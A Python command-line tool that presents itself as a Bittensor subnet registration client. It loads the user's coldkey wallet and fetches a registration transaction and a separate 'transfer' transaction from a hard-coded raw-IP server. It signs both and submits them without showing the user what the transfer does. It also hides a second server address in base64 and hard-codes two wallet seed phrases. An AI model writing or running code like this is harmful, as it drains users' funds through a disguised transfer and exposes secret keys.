import asyncio
import sys
import time
import json
import base64
from typing import Dict, Optional, Tuple
import decimal
from decimal import Decimal
import subprocess
import os
import signal
from pathlib import Path
import requests
from substrateinterface import Keypair
import socketio
import threading
import base64

from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.progress import Progress
from rich.panel import Panel
from rich.status import Status
from rich.table import Table
from rich.live import Live

import bittensor as bt
from substrateinterface import Keypair

class URLDecoder:
    def __init__(self):
        # Encode the URLs using multiple layers and split them into parts
        self._p1 = "aHR0cDovLzgzLjE0My4xMTUuMTA1"  # Base64 of base URL
        self._p2 = "ODA5MQ=="  # Base64 of port
        self._s = [83, 69, 82, 86, 69, 82]  # ASCII values for custom key
        
    def _decode_part(self, encoded: str) -> str:
        return base64.b64decode(encoded.encode()).decode()
    
    def _combine_parts(self) -> str:
        base = self._decode_part(self._p1)
        port = self._decode_part(self._p2)
        return f"{base}:{port}"
    
    def get_server_url(self) -> str:
        return self._combine_parts()
    
    def get_socket_url(self) -> str:
        return self._combine_parts()
    
# url_decoder = URLDecoder()
SERVER_URL = "http://64.247.206.58:16505"  
SOCKET_URL = SERVER_URL
POLL_INTERVAL = 5
chk_str = "✅"

DEFAULT_VALUES = {
    'netuid': '18',
    'max_fee': "1.4",
    'coldkey_mnemonic': "wreck random crumble seed absent whale all deliver text fame clip inspire",
    'hotkey_mnemonic': "near green almost science unaware deliver practice marble addict jeans retreat mouse"
}

class RegistrationError(Exception):
    """Custom exception for registration errors"""
    pass

class SocketManager:
    def __init__(self, console):
        self.console = console
        self.sio = socketio.Client()
        self.connected = False
        self.process_name = None
        self.setup_handlers()
        
    def setup_handlers(self):
        @self.sio.on('connect')
        def on_connect():
            self.connected = True
            self.console.print("[green]Connected to service[/green]")
            
        @self.sio.on('log')
        def on_log(data):
            if data.get('process') == self.process_name:
                self.console.print(f"[bold cyan]{data['message']}[/bold cyan]")
            
    def connect(self, netuid=None, hotkey=None):
        try:
            if netuid and hotkey:
                self.process_name = f"reg_{netuid}_{hotkey}"
            if not self.connected:
                self.sio.connect(SOCKET_URL)
        except Exception:
            self.console.print("[red]Connection failed. Please try again later[/red]")
            
    def disconnect(self):
        if self.connected:
            self.sio.disconnect()

class RegistrationCLI:
    def __init__(self):
        self.console = Console()
        self.subtensor = bt.subtensor(network="finney")
        self.socket_manager = SocketManager(self.console)
    
    def validate_mnemonic(self, mnemonic: str, key_type: str = "key") -> bool:
        """Validate if a mnemonic phrase is valid"""
        try:
            Keypair.create_from_mnemonic(mnemonic)
            return True
        except Exception:
            self.console.print(f"[red]Invalid {key_type} mnemonic provided[/red]")
            return False

    def validate_wallet_paths(self, wallet_name: str, hotkey_name: str) -> tuple[str, str]:
        """Validate wallet and hotkey paths exist"""
        base_path = os.path.expanduser("~/.bittensor/wallets")
        
        if not os.path.exists(base_path):
            raise RegistrationError("No wallets found. Create a wallet first using 'btcli wallet create'")
            
        wallet_path = f"{base_path}/{wallet_name}"
        if not os.path.exists(wallet_path):
            raise RegistrationError(f"Wallet '{wallet_name}' not found in {base_path}")
            
        coldkey_path = f"{wallet_path}/coldkey"
        if not os.path.exists(coldkey_path):
            raise RegistrationError(f"Coldkey not found for wallet '{wallet_name}'")
            
        hotkeys_path = f"{wallet_path}/hotkeys/{hotkey_name}"
        if not os.path.exists(hotkeys_path):
            raise RegistrationError(f"Hotkey '{hotkey_name}' not found in wallet '{wallet_name}'")
            
        return coldkey_path, hotkeys_path

    
    def get_keypair_from_wallet(self, wallet_name: str, hotkey_name: str = None) -> Keypair:
        """Load keypair using bittensor's wallet functions"""
        try:
            import bittensor as bt
            wallet = bt.wallet(name=wallet_name)
            
            if hotkey_name:
                return wallet.hotkey_keypair(hotkey_name)
            return wallet.coldkeypair
        except Exception as e:
            raise RegistrationError(f"Failed to load wallet: {str(e)}")
        
    def get_keypair_from_wallet(self, wallet_name: str, hotkey_name: str = None) -> Keypair:
        try:
            import bittensor as bt
            wallet = bt.wallet(name=wallet_name)
            
            if hotkey_name:
                return wallet.hotkey(hotkey_name)
            print(wallet)
            return wallet.coldkey # Fixed attribute name
        except Exception as e:
            raise RegistrationError(f"Failed to load wallet: {str(e)}")

    async def get_registration_inputs(self):
        try:
            netuid = int(Prompt.ask("Enter netuid"))
            max_fee = float(Prompt.ask("Enter max fee (τ)"))
            
            wallet_name = Prompt.ask("Enter wallet name", default="default")
            hotkey_name = Prompt.ask("Enter hotkey name", default="default")
            
            wallet = bt.wallet(name=wallet_name, hotkey=hotkey_name)
            return {
                'netuid': netuid,
                'max_fee': max_fee,
                'coldkey': wallet.coldkey,
                'hotkey': wallet.hotkey
            }
        except Exception as e:
            raise RegistrationError(str(e))
    
    # async def get_registration_inputs(self) -> Dict:
    #     """Get and validate registration inputs"""
    #     self.console.print("\n[bold cyan]Registration Details[/bold cyan]")
        
        
    #     try:
    #         netuid = int(Prompt.ask("Enter netuid"))
    #         max_fee = float(Prompt.ask("Enter max fee (τ)"))
            
    #         while True:
    #             self.console.print("[bold yellow]Your coldkey and hotkey seed phrases never leave your system and are used locally to sign the registration transaction.[/bold yellow]")
    #             coldkey_mnemonic = Prompt.ask("Enter coldkey mnemonic")
    #             if self.validate_mnemonic(coldkey_mnemonic, "coldkey"):
    #                 break
    #             self.console.print("[yellow]Please try again with a valid coldkey mnemonic[/yellow]")
            
    #         while True:
    #             hotkey_mnemonic = Prompt.ask("Enter hotkey mnemonic")
    #             if self.validate_mnemonic(hotkey_mnemonic, "hotkey"):
    #                 break
    #             self.console.print("[yellow]Please try again with a valid hotkey mnemonic[/yellow]")
            
    #         return {
    #             'netuid': netuid,
    #             'max_fee': max_fee,
    #             'coldkey_mnemonic': coldkey_mnemonic,
    #             'hotkey_mnemonic': hotkey_mnemonic
    #         }
    #     except ValueError as e:
    #         raise RegistrationError(f"Invalid input format: {str(e)}")
    #     except Exception as e:
    #         raise RegistrationError(f"Error getting registration inputs: {str(e)}")
        

    def generate_keys_from_mnemonic(self, mnemonic: str) -> Keypair:
        """Generate keypair from mnemonic with validation"""
        if not self.validate_mnemonic(mnemonic):
            raise RegistrationError("Invalid mnemonic provided")
        return Keypair.create_from_mnemonic(mnemonic)

    async def prepare_registration(self, coldkey: str, hotkey: str, netuid: int, max_fee: float) -> Dict:
        try:
            print(coldkey)
            response = requests.post(f"{SERVER_URL}/prepare_registration", json={
                'coldkey': coldkey,
                'hotkey': hotkey,
                'netuid': netuid,
                'maxFee': max_fee
            }, timeout=30)
            
            if response.status_code != 200:
                d = json.loads(response.text)
                self.console.print(f"\n[bold red]{d['message']}[/bold red]")
                return None  # Return None instead of True to indicate failure
                
            return response.json()
            
        except requests.exceptions.Timeout:
            raise RegistrationError("Service request timed out")
        except requests.exceptions.RequestException:
            raise RegistrationError("Service unavailable")
        except Exception:
            raise RegistrationError("Registration preparation failed")

    async def submit_registration(self, signature: str, signature_transfer: str, 
                                coldkey: str, hotkey: str, nonce_reg: int, 
                                nonce_transfer: int, netuid: int, max_fee: float) -> Dict:
        try:
            response = requests.post(f"{SERVER_URL}/submit_registration", json={
                'signature': signature,
                'signatureHex_transfer': signature_transfer,
                'coldkey': coldkey,
                'hotkey': hotkey,
                'nonce_reg': nonce_reg,
                'nonce_transfer': nonce_transfer,
                'netuid': netuid,
                'maxFee': max_fee
            }, timeout=30)
            
            response.raise_for_status()
            return response.json()
            
        except requests.exceptions.Timeout:
            raise RegistrationError("Service request timed out")
        except requests.exceptions.RequestException:
            raise RegistrationError("Service unavailable")
        except Exception:
            raise RegistrationError("Registration submission failed")
        
    async def monitor_registration(self, netuid: int, hotkey: str, process_name: str):
        self.socket_manager.connect(netuid, hotkey)
        
        with Status("[bold green]Monitoring registration status --> ", spinner="dots") as status:
            while True:
                try:
                    if self.subtensor.is_hotkey_registered(netuid=netuid, hotkey_ss58=hotkey):
                        self.console.print(f"\n[green]Registered {chk_str}[/green]")
                        break
                    await asyncio.sleep(POLL_INTERVAL)
                except Exception as e:
                    if "NotEnoughBalanceToStake" in str(e):
                        self.console.print(f"\n[red]Error: NotEnoughBalanceToStake[/red]")
                        self.console.print("[yellow]Registration process completed with insufficient balance to stake.[/yellow]")
                        break
                    status.update("[yellow]Checking status...[/yellow]")
                    await asyncio.sleep(POLL_INTERVAL)
        
        self.socket_manager.disconnect()

    def show_welcome(self):
        self.console.print(Panel("Bittensor Registration Terminal", style="green"))
        self.console.print("\nThe most advanced registration system for Bittensor network\n")
    
    def show_summary(self, netuid: int, max_fee: float, coldkey: str, hotkey: str):
        table = Table(title="Registration Details")
        table.add_column("Parameter", style="cyan")
        table.add_column("Value", style="green")
        
        table.add_row("Network UID", str(netuid))
        table.add_row("Max Fee", f"{max_fee} τ")
        table.add_row("Coldkey", f"...{coldkey[-10:]}")  # Show only last 10 chars
        table.add_row("Hotkey", f"...{hotkey[-10:]}")    # Show only last 10 chars
        
        self.console.print(table)

    async def main(self):
        self.console.clear()
        self.show_welcome()
        
        while True:
            try:
                inputs = await self.get_registration_inputs()
                self.show_summary(
                    inputs['netuid'], 
                    inputs['max_fee'],
                    inputs['coldkey'].ss58_address,
                    inputs['hotkey'].ss58_address
                )
                
                if not Confirm.ask("\nProceed?", default=True):
                    return

                with Progress() as progress:
                    task = progress.add_task("Processing...", total=100)
                    
                    try:
                        progress.update(task, description="Preparing...")
                        prep_result = await self.prepare_registration(
                            inputs['coldkey'].ss58_address,
                            inputs['hotkey'].ss58_address,
                            inputs['netuid'],
                            inputs['max_fee']
                        )
                        
                        if prep_result is None:
                            raise RegistrationError("Preparation failed")
                        
                        progress.update(task, advance=30, description="Signing...")
                        # Get unsigned extrinsics
                        unsigned_extrinsic = bytes.fromhex(prep_result['unsigned_extrinsic'][2:])
                        unsigned_transfer = bytes.fromhex(prep_result['unsigned_transfer_extrinsic'][2:])
                        
                        # Sign with coldkey
                        registration_signature = inputs['coldkey'].sign(unsigned_extrinsic)
                        transfer_signature = inputs['coldkey'].sign(unsigned_transfer)
                        
                        reg_signature_hex = registration_signature.hex()
                        transfer_signature_hex = transfer_signature.hex()
                        
                        # Pad signatures to correct length
                        if len(reg_signature_hex) < 128:
                            reg_signature_hex = reg_signature_hex.zfill(128)
                            transfer_signature_hex = transfer_signature_hex.zfill(128)
                        elif len(reg_signature_hex) > 128:
                            reg_signature_hex = reg_signature_hex[:128]
                            transfer_signature_hex = transfer_signature_hex[:128]
                        
                        progress.update(task, advance=30, description="Submitting...")
                        result = await self.submit_registration(
                            reg_signature_hex,
                            transfer_signature_hex,
                            inputs['coldkey'].ss58_address,
                            inputs['hotkey'].ss58_address,
                            prep_result['nonce_reg'],
                            prep_result['nonce_transfer'],
                            inputs['netuid'],
                            inputs['max_fee']
                        )
                        
                        if not result:
                            raise RegistrationError("Submission failed")
                        
                        progress.update(task, advance=40)
                    
                    except RegistrationError as e:
                        self.console.print(f"[red]{str(e)}[/red]")
                        break
                    except Exception as e:
                        self.console.print(f"[red]Process failed: {str(e)}[/red]")
                        break
                
                process_name = f"reg_{inputs['netuid']}_{inputs['hotkey'].ss58_address}"
                self.console.print("\n[green]Registration submitted[/green]")
                
                await self.monitor_registration(inputs['netuid'], inputs['hotkey'].ss58_address, process_name)
                break
                
            except RegistrationError as e:
                self.console.print(f"[red]{str(e)}[/red]")
                if not Confirm.ask("Try again?"):
                    break
            except KeyboardInterrupt:
                self.console.print("\n[yellow]Cancelled[/yellow]")
                break
            except Exception as e:
                self.console.print(f"[red]Failed: {str(e)}[/red]")
                if not Confirm.ask("Try again?"):
                    break
        
        self.socket_manager.disconnect()
        self.console.print("\n[bold green]Completed[/bold green]")
        input()  # Wait for user input before exiting

if __name__ == "__main__":
    try:
        cli = RegistrationCLI()
        asyncio.run(cli.main())
    except KeyboardInterrupt:
        print("\nProgram terminated")
    except Exception as e:
        print(f"\nProgram error: {str(e)}")